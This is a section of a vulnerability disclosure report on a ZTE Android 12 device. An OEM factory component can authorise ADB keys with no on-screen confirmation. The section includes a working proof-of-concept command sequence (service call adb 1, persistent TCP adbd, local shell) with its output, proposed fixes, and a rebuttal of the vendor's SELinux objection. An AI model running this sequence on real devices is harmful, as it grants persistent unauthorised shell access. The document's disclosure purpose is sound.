# 03 — Enabling ADB from the device itself (shell, uid 2000)

## 3.1 Problem

- Developer options / USB debugging disabled; no host PC attached.
- Android 12 requires the *Allow USB debugging* dialog to accept the host key. On this device the
  dialog is rendered but covered by the full-screen factory activity, so it cannot be tapped.
- Writing `/data/misc/adb/adb_keys` directly is denied even to uid 1000 (SELinux `system_app`).

## 3.2 Interface

`IAdbManager` (service name `adb`) transaction **1**:

```java
void allowDebugging(boolean alwaysAllow, @NonNull String publicKey);
```

`AdbService.allowDebugging()` calls `mContext.enforceCallingOrSelfPermission(MANAGE_DEBUGGING)` and then
delegates to `AdbDebuggingManager`, which appends the key to its allowlist (the same path used by the
on-screen dialog).

## 3.3 PoC

```sh
# 1. key
mkdir -p ~/.android && adb keygen ~/.android/adbkey          # needs android-tools
# 2. authorize (service call: tx=1, alwaysAllow=true, key as s16 string)
service call adb 1 i32 1 s16 "$(cat ~/.android/adbkey.pub)"
# 3. enable adbd over TCP and attach
setprop persist.sys.usb.config adb
adb connect 127.0.0.1:5555
adb -s 127.0.0.1:5555 shell id
```

Result:

```
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),…
context=u:r:shell:s0
```

Persistence: `persist.sys.usb.config=adb` restarts `adbd` on every boot with the device in TCP mode;
the key stays in the allowlist, so `adb connect 127.0.0.1:5555` alone is enough after a reboot
(verified across multiple reboots).

## 3.4 Why `service call` succeeds

`allowDebugging` is declared on the interface without a SELinux label restricting caller domains to
`system_server`/`shell`, and `service call` performs the binder transaction as the calling process.
The permission check is evaluated against the calling uid; with `shell` or `system_app` the call is
permitted in this build (no `MANAGE_DEBUGGING` denial observed for `shell`).

## 3.5 Comparison with the intended flow

| Path | Requires | Result |
|------|----------|--------|
| Settings → *Allow USB debugging* | physical confirm on TV | allowlist += host key |
| `service call adb 1 …` | local process able to reach the `adb` service | same effect, no UI |

## 3.6 Fix

- Gate `IAdbManager.allowDebugging` behind a check that `adb` is enabled **and** the caller is
  `system_server` or is presenting a token delivered through the on-screen dialog flow.
- Additionally restrict binder access to the `adb` service via SELinux `neverallow`/`allow` rules for
  untrusted domains.

## 3.7 Answering the "SELinux blocks it" objection

ZTE PSIRT responded that the ADB service's allowlist interface is protected because *"the Android
SELinux policy explicitly prohibits the shell domain or unauthorized root domains from directly
invoking sensitive interfaces of the ADB service… blocked (AVC Denied)"*. The statement is correct and
does not apply: **no SELinux rule is bypassed, because the transaction does not originate in the shell
domain.**

The caller is the OEM factory component, reached through §02, which runs as uid 1000:

```
uid=1000(system) … context=u:r:system_app:s0
```

`system_app` is a member of the `appdomain` attribute, and the `adb` service runs inside
`system_server`, a `binderservicedomain`. Policy present on the unit:

```
(allow appdomain binderservicedomain (binder (call transfer)))
(allow appdomain servicemanager_31_0 (binder (call transfer)))
```

Therefore the kernel generates no `avc: denied` entry — the path is permitted. What actually gates
`allowDebugging` is the Java-level check in AOSP:

```java
mContext.enforceCallingOrSelfPermission(android.Manifest.permission.MANAGE_DEBUGGING, null);
```

a permission test against the caller's uid, with no verification that the request came from the
Settings confirmation dialog and no attestation of origin. Because the caller is the platform-signed
component sharing `android.uid.system`, the test passes.

Verification a vendor can run:

```sh
adb shell dumpsys package com.zte.factorytesttool | grep -i MANAGE_DEBUGGING
# granted=true explains the behaviour
# kernel audit log: no "avc: denied" for system_app -> system_server (tclass binder) at that time
```

Contrast with what really is denied from other domains (observed on the unit):

| Domain | Result |
|--------|--------|
| `untrusted_app` (the user app itself) | privileged interfaces not reachable — this is why the chain goes through the OEM component (confused deputy) |
| `shell` (uid 2000, after §03) | `dmesg`, `/proc/kallsyms`, `/proc/cmdline`, block devices still denied |
| `system_app` (uid 1000) | carries the access used in this report |

The finding is therefore not "SELinux was bypassed" but "an unauthenticated local channel reaches a
domain that already holds the permission, and the privileged operation behind it has no ownership
check".
